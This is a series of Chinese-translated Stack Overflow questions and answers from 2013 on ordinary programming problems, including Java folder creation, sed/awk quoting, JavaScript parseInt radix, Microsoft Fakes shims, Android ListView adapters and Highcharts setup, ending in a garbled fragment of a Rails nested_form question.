现在我一定是做错了什么，或者在某个地方不理解某些东西，因为似乎有大量的碰撞。任何帮助，将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:15:57.443

您不应该通过 % 127 修改散列，这只会产生 127 个可能的输出，而根据您的 8000 个唯一词推理，您似乎想要 128^2 个可能的输出。

# java - 如何在 Linux 下创建一个用 Java 编写的带有空格的文件夹？

> ID：14916146
> 
> 赞同：3
> 
> 时间：2013-02-16T23:07:24.603
> 
> 标签：java, linux, space

我有一个严重的问题

我想使用带有运行时界面的 Java 类运行 Linux 命令，有一个命令可以创建一个名为“My Folder”的文件夹，并带有一个空格

创建 Unix 命令很容易： mkdir My\ Folder 或 mkdir "My Folder"

但是如何用 Java 翻译这个，我尝试了两个命令： Runtime.exec("mkdir My\ Folder") Runtime.exec("mkdir \"My Folder\"")

这是一个例子：

```
import java.io.IOException;
public class CreerDossier {
    public static void main(String[] args) throws IOException {
        Runtime runtime = Runtime.getRuntime();
        runtime.exec("mkdir My\\ Folder");
        runtime.exec("mkdir \"My Folder\"");
    }
} 
```

但是还是不行

对于 runtime.exec("mkdir My\ Folder") 它创建两个文件夹 My\ 和 Folder 对于 runtime.exec("mkdir \"My Folder\"") 它还创建两个文件夹 "My and Folder"

有解决方案吗？

谢谢 ！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T23:09:44.750

[`File.mkdir()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/File.html#mkdir%28%29)使用它要容易得多

```
File dir = new File("My Folder");
dir.mkdir(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-16T23:45:36.120

其他答案已经解释了如何在目录名称中放置空格。我想试着说服你不要这样做。

按照惯例，Linux 上的路径名中没有空格。当然文件系统允许这样做，依此类推。但这让 Linux 用户的生活变得尴尬：

*   从命令提示符输入带有空格的路径名时，您始终必须记住引用它们或转义空格。

*   在编写路径名存储在变量中的 shell 脚本时，您必须小心路径名中可能有 / 空格。如果你不这样做，脚本很可能会中断。

结合这些，你会发现你漂亮的目录名称中带有空格实际上是一个麻烦......或者更糟。

我的建议是重新设计您的系统以避免这种情况。要么首先不允许您的系统用户在名称中放置空格，要么（如果您必须支持这一点，因为这是一项要求）然后：

*   使用 URL-style percent-encoding 之类的东西对文件名进行编码，这样空格字符就不会在文件系统的实际路径名中表示为空格，或者
*   将用户提供的名称存储在数据库中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T23:18:11.507

```
runtime.exec(new String[] { "mkdir", "My Folder" }); 
```

# javascript - 谷歌可视化大型数组表

> ID：14916152
> 
> 赞同：1
> 
> 时间：2013-02-16T23:07:54.587
> 
> 标签：javascript, google-visualization, etl, bigdata

将 Google 可视化与大型数组一起使用时出现问题。我只是想从一个有 80,000 行的表中创建一个数据视图，并且对谷歌的请求冻结了。具体来说：

```
 var data = google.visualization.arrayToDataTable([80,000rows,3 columns])

  var dataView = new google.visualization.DataView(data);
  dataView.setRows(5, 10);//display 5 rows 
```

如果“数据”数组中有 30,000 行，Google 可视化会创建我需要的 5 行显示，但它会卡在 80,000 行

有谁知道如何在大数据表上获得谷歌可视化？如果不是，什么是非常基本的 ETL 和可视化的开源工具？

# java - 使用基于数组的链表实现 ADT 列表

> ID：14916154
> 
> 赞同：1
> 
> 时间：2013-02-16T23:08:13.660
> 
> 标签：java, arrays, linked-list

我正在尝试实现一个基于数组的链表，该链表必须按字母顺序排列。到目前为止，我有要插入和节点的代码，但想检查我是否正确，以及是否有人可以帮助我编写一个主要方法来显示列表的元素。下面是我到目前为止的代码。

```
package listpackage;

import java.io.IOException;

public class ArrayLL {
private int MAX_CAP = 100;
private ANode[] list;
private int size;

public ArrayLL(){
    list = new ANode[MAX_CAP];
    list[list.length-1] = new ANode(null, -1);
    for(int i = 0; i < list.length-1; i++){
        list[i] = new ANode(null, i+1);
    }
    size = 0;
}

public void addElem(String s) throws IOException{
    if(size == 0){
        ANode a = new ANode(s, -1);
        list[0] = a;
        size++;
    }else if(size == MAX_CAP + 1){
        throw new IOException("List is full");
    }else{
        ANode a = list[0];
        for(int i = 0; i< size; i++){
            if(a.getData().compareTo(s)>0){
                ANode b = new ANode(s,i+1);
                for(int j = size; j > i; j--){
                    list[j] = list[j+1];
                }
                list[i] = b;
                size++;
                break;
            }else{
                ANode c = new ANode(s,-1);
                list[size+1] = c;
            }
        }
    }
}

public int getSize(){
    return size;
}

}

class ANode{
private String data;
private int link;

public ANode(String d, int l){
    data =  d;
    link = l;
}

public String getData(){
    return data;
}

public int getLink(){
    return link;
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:36:33.947

要打印列表的元素，您需要对其进行迭代以查看内容。

```
for(Object obj : list) {
  System.out.println(obj);
} 
```

你的对象也需要被`.toString()`覆盖。

希望这可以帮助

# apache - 在 apache 日志中表示 ipv6 条目

> ID：14916156
> 
> 赞同：0
> 
> 时间：2013-02-16T23:08:17.293
> 
> 标签：apache

我有一个带有 ipv4 和 ipv6 地址的服务器设置。当有人使用 ipv6 连接时，ipv6 地址会显示在 apache 日志中。当有人使用 ipv4 连接时，ipv4 地址会显示在 apache 日志中。

最近，决定不记录请求页面的人的 ip。但是，这使得很难确定连接的用户是通过 ipv4 还是 ipv6 连接的。因此，我的问题是：是否可以在日志中创建表示客户端使用 ipv6 的内容？也许只是行尾的“v6”之类的。

这是我的虚拟主机配置的日志部分的样子：

```
LogFormat "0.0.0.0 - - %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %T %V" noip
CustomLog /var/www/example.com/logs/access.log noip 
```

请不要开始讨论是否记录IP。这不是我的问题。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:11:00.690

如果添加`%A`（本地 IP 地址），这应该表明连接是通过本地系统的 IPv4 地址还是通过其 IPv6 地址到达的。

# sed - sed：用下划线替换引号内的空格

> ID：14916159
> 
> 赞同：4
> 
> 时间：2013-02-16T23:08:31.143
> 
> 标签：sed, awk, tcsh, openbsd

我的输入（例如，来自`ifconfig run0 scan`OpenBSD）有一些由空格分隔的字段，但一些字段本身包含空格（幸运的是，这些包含空格的字段总是用引号引起来）。

我需要区分引号内的空格和分隔符空格。这个想法是用下划线替换引号内的空格。

样本数据：

```
%cat /tmp/ifconfig_scan | fgrep nwid | cut -f3
nwid Websense chan 6 bssid 00:22:7f:xx:xx:xx 59dB 54M short_preamble,short_slottime
nwid ZyXEL chan 8 bssid cc:5d:4e:xx:xx:xx 5dB 54M privacy,short_slottime
nwid "myTouch 4G Hotspot" chan 11 bssid d8:b3:77:xx:xx:xx 49dB 54M privacy,short_slottime 
```

最终没有按照我想要的方式处理，因为我还没有用下划线替换引号内的空格：

```
%cat /tmp/ifconfig_scan | fgrep nwid | cut -f3 |\
    cut -s -d ' ' -f 2,4,6,7,8 | sort -n -k4
"myTouch Hotspot" 11 bssid d8:b3:77:xx:xx:xx
ZyXEL 8 cc:5d:4e:xx:xx:xx 5dB 54M
Websense 6 00:22:7f:xx:xx:xx 59dB 54M 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T23:35:57.787

试试这个：

```
awk -F'"' '{for(i=2;i<=NF;i++)if(i%2==0)gsub(" ","_",$i);}1' OFS="\"" file 
```

它适用于一行中的多引号部分：

```
echo '"first part" foo "2nd part" bar "the 3rd part comes" baz'| awk -F'"' '{for(i=2;i<=NF;i++)if(i%2==0)gsub(" ","_",$i);}1' OFS="\"" 
"first_part" foo "2nd_part" bar "the_3rd_part_comes" baz 
```

编辑替代形式：

```
awk 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' file 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-17T01:57:36.380

对于`sed`-only 解决方案（我不一定提倡），请尝试：

```
echo 'a b "c d e" f g "h i"' |\
sed ':a;s/^\(\([^"]*"[^"]*"[^"]*\)*[^"]*"[^"]*\) /\1_/;ta'
a b "c_d_e" f g "h_i" 
```

翻译：

*   从行首开始。
*   寻找模式`junk"junk"`，重复零次或多次，其中`junk`没有引号，然后是`junk"junk space`.
*   用 替换最后的空格`_`。
*   如果成功，则跳回到开头。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-18T13:44:56.500

另一个 awk 尝试：

```
awk '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" 
```

删除引号：

```
awk '!(NR%2){gsub(FS,"_")}1' RS=\" ORS= 
```

* * *

在@steve 完成的早期测试的基础上，使用三倍大小的测试文件进行了一些额外的测试。我不得不`sed`稍微改变一下语句，以便非 GNU`sed`也可以处理它。我包括`awk`( `bwk`)`gawk3`和`gawk4`:`mawk`

```
$ for i in {1..1500000}; do echo 'a b "c d e" f g "h i" j k l "m n o "p q r" s t" u v "w x" y z' ; done > test
$ time perl -pe 's:"[^"]*":($x=$&)=~s/ /_/g;$x:ge' test >/dev/null

real    0m27.802s
user    0m27.588s
sys 0m0.177s
$ time awk 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' test >/dev/null

real    0m6.565s
user    0m6.500s
sys 0m0.059s
$ time gawk3 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' test >/dev/null

real    0m21.486s
user    0m18.326s
sys 0m2.658s
$ time gawk4 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' test >/dev/null

real    0m14.270s
user    0m14.173s
sys 0m0.083s
$ time mawk 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' test >/dev/null

real    0m4.251s
user    0m4.193s
sys 0m0.053s
$ time awk '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" test >/dev/null

real    0m13.229s
user    0m13.141s
sys 0m0.075s
$ time gawk3 '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" test >/dev/null

real    0m33.965s
user    0m26.822s
sys 0m7.108s
$ time gawk4 '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" test >/dev/null

real    0m15.437s
user    0m15.328s
sys 0m0.087s
$ time mawk '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" test >/dev/null

real    0m4.002s
user    0m3.948s
sys 0m0.051s
$ time sed -e :a -e 's/^\(\([^"]*"[^"]*"[^"]*\)*[^"]*"[^"]*\) /\1_/;ta' test > /dev/null

real    5m14.008s
user    5m13.082s
sys 0m0.580s
$ time gsed -e :a -e 's/^\(\([^"]*"[^"]*"[^"]*\)*[^"]*"[^"]*\) /\1_/;ta' test > /dev/null

real    4m11.026s
user    4m10.318s
sys 0m0.463s 
```

`mawk`呈现最快的结果...

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-17T08:00:41.137

你最好用`perl`. 代码更具可读性和可维护性：

```
perl -pe 's:"[^"]*":($x=$&)=~s/ /_/g;$x:ge' 
```

根据您的输入，结果是：

```
a b "c_d_e" f g "h_i" 
```

解释：

```
-p            # enable printing
-e            # the following expression...

s             # begin a substitution

:             # the first substitution delimiter

"[^"]*"      # match a double quote followed by anything not a double quote any
              # number of times followed by a double quote

:             # the second substitution delimiter

($x=$&)=~s/ /_/g;      # copy the pattern match ($&) into a variable ($x), then 
                       # substitute a space for an underscore globally on $x. The
                       # variable $x is needed because capture groups and
                       # patterns are read only variables.

$x            # return $x as the replacement.

:             # the last delimiter

g             # perform the nested substitution globally
e             # make sure that the replacement is handled as an expression 
```

* * *

一些测试：

```
for i in {1..500000}; do echo 'a b "c d e" f g "h i" j k l "m n o "p q r" s t" u v "w x" y z' >> test; done

time perl -pe 's:"[^"]*":($x=$&)=~s/ /_/g;$x:ge' test >/dev/null

real    0m8.301s
user    0m8.273s
sys     0m0.020s

time awk 'BEGIN{FS=OFS="\""} {for(i=2;i<NF;i+=2)gsub(" ","_",$i)} 1' test >/dev/null

real    0m4.967s
user    0m4.924s
sys     0m0.036s

time awk '!(NR%2){gsub(FS,"_")}1' RS=\" ORS=\" test >/dev/null

real    0m4.336s
user    0m4.244s
sys     0m0.056s

time sed ':a;s/^\(\([^"]*"[^"]*"[^"]*\)*[^"]*"[^"]*\) /\1_/;ta' test >/dev/null

real    2m26.101s
user    2m25.925s
sys     0m0.100s 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-17T12:41:44.150

不是答案，只是发布 @steve 的 perl 代码的 awk 等效代码以防万一有人感兴趣（并帮助我将来记住这一点）：

@steve 发布：

```
perl -pe 's:"[^\"]*":($x=$&)=~s/ /_/g;$x:ge' 
```

并且通过阅读@steve 的解释，与该 perl 代码等效的最简短的 awk（不是首选的 awk 解决方案 - 请参阅@Kent 的答案）将是 GNU awk：

```
gawk '{
   head = ""
   while ( match($0,"\"[^\"]*\"") ) {
      head = head substr($0,1,RSTART-1) gensub(/ /,"_","g",substr($0,RSTART,RLENGTH))
      $0 = substr($0,RSTART+RLENGTH)
   }
   print head $0
}' 
```

我们从具有更多变量的 POSIX awk 解决方案开始：

```
awk '{
   head = ""
   tail = $0
   while ( match(tail,"\"[^\"]*\"") ) {
      x = substr(tail,RSTART,RLENGTH)
      gsub(/ /,"_",x)
      head = head substr(tail,1,RSTART-1) x
      tail = substr(tail,RSTART+RLENGTH)
   }
   print head tail
}' 
```

并使用 GNU awk 的 gensub() 保存一行：

```
gawk '{
   head = ""
   tail = $0
   while ( match(tail,"\"[^\"]*\"") ) {
      x = gensub(/ /,"_","g",substr(tail,RSTART,RLENGTH))
      head = head substr(tail,1,RSTART-1) x
      tail = substr(tail,RSTART+RLENGTH)
   }
   print head tail
}' 
```

然后摆脱变量x：

```
gawk '{
   head = ""
   tail = $0
   while ( match(tail,"\"[^\"]*\"") ) {
      head = head substr(tail,1,RSTART-1) gensub(/ /,"_","g",substr(tail,RSTART,RLENGTH))
      tail = substr(tail,RSTART+RLENGTH)
   }
   print head tail
}' 
```

然后摆脱变量“tail”，如果你不需要 $0，NF 等，在循环后留下来：

```
gawk '{
   head = ""
   while ( match($0,"\"[^\"]*\"") ) {
      head = head substr($0,1,RSTART-1) gensub(/ /,"_","g",substr($0,RSTART,RLENGTH))
      $0 = substr($0,RSTART+RLENGTH)
   }
   print head $0
}' 
```

# javascript - JavaScript - 不同浏览器中的 parseInt 不一致

> ID：14916160
> 
> 赞同：0
> 
> 时间：2013-02-16T23:08:50.013
> 
> 标签：javascript, json, multidimensional-array

编辑：问题是我在使用 parseInt 时没有指定基数。我想确切地了解为什么会发生这种情况 - 我会奖励任何能告诉我为什么这只会给 Firefox 中的 08 和 09 值造成问题的人的答案！

* * *

我有一个二维整数数组作为 JSON 对象存储在 MySQL 数据库中。

当我通过 jquery 的 ajax 请求这个对象时，JSON 验证 - 它也通过[JSONLint](http://jsonlint.com)没有意外。然后我将其转换为二维 javascript 数组，使用 parseInt 将纯字符串 JSON 键转换为数组的整数键。

这在几乎所有浏览器/平台上都可以正常工作：

原始 JSON：

```
....
"07": [0, 1...
"08": [0, 1...
"09": [1, 1...
"10": [1, 0...
.... 
```

循环输出（Safari/Chrome，OSX）：

```
JSON Key (parseInt value): [array]
....
07 (7): [0, 1...
08 (8): [0, 1...
09 (9): [1, 1...
10 (10): [1, 0...
.... 
```

循环输出（Firefox OSX，iOS）：

```
JSON Key (parseInt value): [array]
....
07 (7): [0, 1...
08 (0): [0, 1...
09 (0): [1, 1...
10 (10): [1, 0...
.... 
```

...有没有搞错？这些键（8 和 9）是唯一没有正确通过 parseInt 的键，并且它的发生非常一致。我已经验证 JSON 数组完整且未经修改地进入所有浏览器 - 密钥仍然是 08 和 09 的事实就是证明。但是，一旦 08 和 09 通过 parseint，它们就会返回 0。18 和 19 正确通过，28 和 29 也是如此。这两个键周围没有杂散空格、非 ascii 字符或任何其他可能导致它们的键被错误地阅读。我完全被难住了。

[你可以在这里](http://pastebin.com/C2FiYM8A)找到我的完整 JSON 。我错过了什么？

或者，如果有一种方法可以完全绕过它，我愿意考虑。感谢您的帮助，这让我发疯了！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:10:45.307

以 开头的字符串`0`的基数可以是八进制（当未指定基数时 - 取决于浏览器）。

您正在寻找：

```
parseInt("09", 10);// parseInt("09")=0
parseInt("08", 10);// parseInt("08")=0 
```

**为什么？**

如果 radix 未定义或为 0，JavaScript 假定如下：

> *   如果输入字符串以“0x”或“0X”开头，则基数为 16（十六进制）。
> *   如果输入字符串以“0”开头，则基数为八（八进制）。这个特性是非标准的，一些实现故意不支持它（而是使用基数 10）。由于这个原因，在使用 parseInt 时总是指定一个基数。
> *   如果输入字符串以任何其他值开头，则基数为 10（十进制）。

**parseInt('08') 和 parseInt('09') 都返回零，因为**函数试图确定所用数值系统的正确基数。在 Javascript 中，以零开头的数字被认为是八进制，八进制中没有 08 或 09，因此存在问题。

请参阅文档[`parseInt`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/parseInt)：

```
 var test = parseInt(value, 10); 
```

你必须告诉它你想要`value`你所定位的输入。

而且，始终提供第二个参数（基数）给`parseInt`. 如果没有提供它，它会尝试过于聪明并自动检测它，并可能导致意想不到的结果。

提供`10`假设您想要一个以 10 为基数的数字。

# c# - 如何使用 Microsoft Fakes 获取基类的垫片？

> ID：14916162
> 
> 赞同：19
> 
> 时间：2013-02-16T23:08:56.577
> 
> 标签：c#, microsoft-fakes

```
class Parent{
   public string Name{ get; set; }
}

class Child :Parent{
   public string  address{ get; set; }
}

[TestClass]
class TestClass{
   [TestMethod]
   public void TestMethod()
   {
      var c = new Fakes.Child();
      c.addressGet = "foo"; // I can see that
      c.NameGet = "bar"; // This DOES NOT exists
   }
} 
```

如何在上述代码示例中设置“名称”？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2014-02-22T06:33:34.023

生成的类`Parent`将有一个如下所示的构造函数`ShimParent(Parent p)`：

您需要做的就是：

```
var child = new ShimChild();
var parent = new ShimParent(child); 
```

并在各自的垫片上设置适当的值。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-03-26T08:29:18.240

您必须在基类上声明它。最简单的方法是调用基类的 AllInstances 属性：

```
[TestClass]
public class UnitTest1
{
    [TestMethod]
    public void TestMethod1()
    {
        ClassLibrary1.Child myChild = new ClassLibrary1.Child();

        using (ShimsContext.Create())
        {
            ClassLibrary1.Fakes.ShimChild.AllInstances.addressGet = (instance) => "foo";
            ClassLibrary1.Fakes.ShimParent.AllInstances.NameGet = (instance) => "bar";

            Assert.AreEqual("foo", myChild.address);
            Assert.AreEqual("bar", myChild.Name);
        }

    }
} 
```

还要始终尝试添加 ShimsContext 以确保正确清洁您的 shim。否则，您的其他单元测试也将获得您之前声明的返回值。有关 ShimsContext 的信息可在此处找到：http: [//msdn.microsoft.com/en-us/library/hh549176.aspx#ShimsContext](http://msdn.microsoft.com/en-us/library/hh549176.aspx#ShimsContext)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-18T21:02:19.150

我已经根据以前的答案、Microsoft 文档和我自己的实验组合了一个解决方案。我还更改`TestMethod`了一点以显示我将如何实际使用它进行测试。注意：我没有编译这个特定的代码，所以如果它不能按原样工作，我深表歉意。

```
[TestClass]
class TestClass
{
   [TestMethod]
   public void TestMethod()
   {
      using (ShimsContext.Create())
      {
         Child child = CreateShimChild("foo", "bar");

         Assert.AreEqual("foo", child.address);  // Should be true
         Assert.AreEqual("bar", child.Name);     // Should be true
      }
   }

   private ShimChild CreateShimChild(string foo, string bar)
   {
      // Create ShimChild and make the property "address" return foo
      ShimChild child = new ShimChild() { addressGet = () => foo };

      // Here's the trick: Create a ShimParent (giving it the child)
      // and make the property "Name" return bar;
      new ShimParent(child) { NameGet = () => bar };

      return child;
   }
} 
```

我不知道返回的孩子如何知道它`Name`应该返回“bar”，但确实如此！如您所见，您甚至不需要保存`ShimParent`任何位置；它只是为了指定`Name`属性的值而创建的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-18T03:02:48.683

到目前为止，我认为没有一个建议的方法可行。经过大量的试验和错误，我想出了以下对我有用的代码。基本上，您将必须定义一个初始化您的子类的委托，并在该委托中连接您的子类应继承的父 Shim。

```
public void TestMethod()
    {
        //var c = new Fakes.Child();
        //c.addressGet = "foo"; // I can see that
        //c.NameGet = "bar"; // This DOES NOT exists

        using (ShimsContext.Create())
        {
            ShimChild childShim = null;
            ShimChild.Constructor = (@this) =>
            {

                childShim = new ShimChild(@this);
                // the below code now defines a ShimParent object which will be used by the ShimChild object I am creating here
                new ShimParent()
                {
                    NameSetString = (value) =>
                    {
                        //do stuff here
                    },
                    NameGet = () =>
                    {
                        return "name";
                    }
                };
            };
        }
    } 
```

# ruby-on-rails - 尝试运行 rails 控制台

> ID：14916163
> 
> 赞同：0
> 
> 时间：2013-02-16T23:08:57.447
> 
> 标签：ruby-on-rails, console

我正在尝试启动“rails 控制台”，但它不起作用，我收到以下消息：

```
create  
create  app/controllers
  create  app/helpers
  create  app/models
  create  app/views/layouts
  create  config/environments
  create  config/initializers
  create  config/locales
  create  db
  .... 
```

并且没有控制台正在运行？这个命令不合适吗？

更新：我从 app 文件夹运行这个命令！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:11:36.450

你必须在你的 Rails 应用程序目录中

# android - ListView 中每一行的自定义布局

> ID：14916164
> 
> 赞同：1
> 
> 时间：2013-02-16T23:09:17.133
> 
> 标签：android, listview, button, custom-adapter

我试图让一个按钮在 ListView Row 中工作。我一直在阅读有关自定义适配器的信息，但无法使其正常工作。基本上，我有一个 List_item 类，它有 4 个 TextView 和 1 个按钮，可以在另一个类中找到 ListView。其中一个 textViews 具有 id/Name。所以我想要的是当我按下该行上的按钮时。它将获得 TextView“名称”的值并将其添加到 ArrayList 中，如果我按下不同行上的另一个按钮，它会将“名称”的值添加到同一个数组列表中。所以基本上会将我在按钮上按下的所有按钮添加到 ArrayList 中。那可能吗？？。

只是添加。我的数据库正在输入 textView ..感谢任何回复。

List_item.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/RelativeLayout1"
android:layout_width="fill_parent"
android:layout_height="match_parent"
android:orientation="vertical"
android:paddingBottom="10dp" >

 <TableRow
    android:id="@+id/tableRow1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:baselineAligned="false" >

    <TextView
        android:id="@+id/id"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:textColor="#FFFFFF"
        android:visibility="gone" />

    <TextView
        android:id="@+id/name"
        android:layout_width="wrap_content"
        android:layout_height="match_parent"
        android:layout_gravity="left"
        android:layout_weight="3"
        android:textAllCaps="true"
        android:textColor="#FFFFFF"
        android:textSize="30sp"
        android:textStyle="bold"
        android:typeface="serif" />

    <TextView
        android:id="@+id/price"
        android:layout_width="wrap_content"
        android:layout_height="match_parent"
        android:layout_gravity="center"
        android:layout_weight="1"
        android:gravity="right"
        android:paddingRight="15dp"
        android:textAllCaps="true"
        android:textColor="#FFFFFF"
        android:textSize="30sp"
        android:textStyle="bold"
        android:typeface="serif" />

    <Button
        android:id="@+id/order"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:layout_weight="0"
        android:focusable="false"
        android:minHeight="0dp"
        android:minWidth="50dp"
        android:text="+"
        android:textStyle="bold" />

</TableRow>

<TableRow
    android:id="@+id/tableRow2"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/tableRow1"
    android:gravity="center_horizontal" >

    <TextView
        android:id="@+id/description"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:textAllCaps="true"
        android:textColor="#FFFFFF"
        android:textSize="20sp"
        android:textStyle="bold"
        android:typeface="serif"
        android:visibility="gone" />

</TableRow>

</RelativeLayout> 
```

我的 menu.xml 有

```
<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="697dp" >
</ListView> 
```

现在，当我按下其行上的按钮时，我想获取 TextView“名称”的值。

这就是我在添加按钮之前填充我的 listView 的方式，它工作正常

```
 ListAdapter adapter = new SimpleAdapter (getCategoryItems.this,itemsList,R.layout.list_item, new String[]{ TAG_ID, TAG_NAME,TAG_PRICE, TAG_DESCRIPTION},new int[] { R.id.id, R.id.name, R.id.price, R.id.description});
setListAdapter(adapter); 
```

但是现在在我添加按钮后它没有得到任何值所以我重新搜索，我发现我必须将我的 sampleAdapter 更改为自定义适配器。并在 getView() 中添加按钮，但我无法掌握它。

我的按钮 OnClickListener

```
Button order = (Button) view.findViewById(R.id.order);
order.setOnClickListener(new Button.OnClickListener() {
    @Override 
    public void onClick(View v) { 
        String name = ((TextView)view.findViewById(R.id.name)).getText().toString();
        Log.d("Selected : ", name);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:54:03.657

您将需要为您的`ListView`. 由于您是从数据库中获取数据，我建议您扩展`CursorAdapter`和覆盖`newView()`and `bindView()`。根据我的经验，如何正确执行此操作的文档很少，因此我将尝试在这里给出一些指示。

在`newView()`中，您需要使用`LayoutInflator`通过调用`getLayoutInflator()`您的`ListActivity`. 在你调用`inflate()`这个之后`LayoutInflator`，你可以获取该特定行的 Button 并设置它的`OnClickListener`.

在`bindView()`中，您几乎可以做所有相同的事情，除了您不需要扩充新视图，因为 Android 要求您重用现有`View`对象。您可能想要创建一些额外的方法以减少重复代码的数量。

我希望这会有所帮助，即使它是用英语而不是代码示例来解释的。

# ember.js - 绑定到对象的数量

> ID：14916165
> 
> 赞同：1
> 
> 时间：2013-02-16T23:09:33.783
> 
> 标签：ember.js, ember-data

我试图了解如何创建绑定或计算属性，即我拥有的对象数量。我可以通过以下方式获得号码（我认为）：

```
App.MyObject.all().get("length") 
```

当我在函数内部创建一个控制器属性时，它不会随着更多对象的下载而更新。

```
numOfMyObjects: function(){
  return App.MyObject.all().get("length");
}.property() 
```

现在我在我的 ApplicationController 中有这个，但它只显示 0。

我想知道如何对所有对象执行此操作，然后还对一组过滤的对象执行此操作。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:18:29.250

You need to tell Ember on which properties it should observe to fire the `numOfMyObjects` method. For example:

```
numOfMyObjects: function(){
  return App.MyObject.all().get("length");
}.property('myArray.length'); 
```

However, this won't work in your case because you've got `App.MyObject` in your controller itself, instead you want to be instructing the appropriate route which model(s) the controller should represent.

This way you won't actually need to create a computed property, because you'll have access to the `model` in your Handlebars.

Please see the JSFiddle I've put together as an example: [http://jsfiddle.net/ESkkb/](http://jsfiddle.net/ESkkb/)

The main part of the code lies in the `IndexRoute`:

```
App.IndexRoute = Ember.Route.extend({
    model: function() {
        return App.Cat.find();
    }
}); 
```

We're telling the `IndexController` that it should represent all of the cats. And then once we've done that, we can display the cats in our view, or in our case, the number of cats:

```
Count: {{length}} 
```

# javascript - 高图不起作用

> ID：14916166
> 
> 赞同：1
> 
> 时间：2013-02-16T23:09:42.410
> 
> 标签：javascript, jquery, highcharts

所以我正在尝试使用 HighCharts.js 库来创建图表。这是我的代码：

```
<html>
<head>
    <script src="jquery.min.js"></script>
    <script src="highcharts.js"></script>
    <script type="text/javascript">
    $(document).ready(function() { 
        var chart1 = new Highcharts.Chart({
            chart: { renderTo: 'container', type: 'bar' },
            title: { text: 'Fruit Consumption'},
            xAxis: { categories: ['Apples', 'Bananas', 'Oranges'] },
            yAxis: { title: { text: 'Fruit eaten'} },
            series: [ {name: 'Jane', data: [1, 0, 4] }, { name: 'John', data: [5, 7, 3]} ]
        });
    });​
    </script>
</head>
<body>
<div id="container" style="width:100%; height:400px;"> 

</div>
</body>
</html> 
```

我试图在我的浏览器中运行它，但没有任何反应。有人可以告诉我我做错了什么吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:15:36.617

这直接来自 HighCharts 演示页面。

Alex W 是对的，您错误地引用了主题，它是可选的。主题实际上是一个 JS 文件，但您需要使用 Script 语法。

```
<script type="text/javascript" src="/js/themes/gray.js"></script> 
```

我会检查您的控制台以确保您正确加载了所有脚本。您的 highcharts.js 文件的路径可能有误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-28T16:58:26.113

这发生在我身上，但我用这个解决了：

```
#### This code is HighChart image ####
<script src="http://code.highcharts.com/highcharts.js"></script>
<script src="http://code.highcharts.com/modules/exporting.js"></script>

##### To show High Chart Code ####
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> 
```

如果这不起作用，请尝试将 jquery.min.js 、 highchart.js 和 exporting.js 保存在文件中。

如果您在此处需要更多帮助，请尝试以下操作：

```
http://stackoverflow.com/questions/19983869/issue-having-blank-graphic-in-highchart-script 
```

# ruby-on-rails - ryanb / nested_form 未定义方法 `link_to_remove' for # 我对 gem nested_form 有一点问题。我有： class Factura < ActiveRecord::Base attr_accessible :itemfacturas_attributes has_many :itemfactura 问问题 问问题 2013-02-16T23:10:58.123 4137 次 This question shows research effort; it is useful and clear 2 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我对 gem nested_form 有一点问题。我有： class Factura < ActiveRecord::Base attr_accessible :itemfacturas_attributes has_many :itemfacturas has_many :productos, :through => :itemfacturas accepts_nested_attributes_for :itemfacturas, :reject_if => lambda { |a| a[:descripcion].blank? }, :allow_destroy => true 和 ItemFactura 类 class Itemfactura < ActiveRecord::Base attr_accessor :vu, :vt, :descripcion belongs_to :factura belongs_to :producto 我在 facturas/new 视图中使用 gem 来添加 itemfacturas。 <%= f.fields_for :itemfacturas do |b| %> <%= render 'itemfacturas/itemfacturas', f: b %> <% end -%> 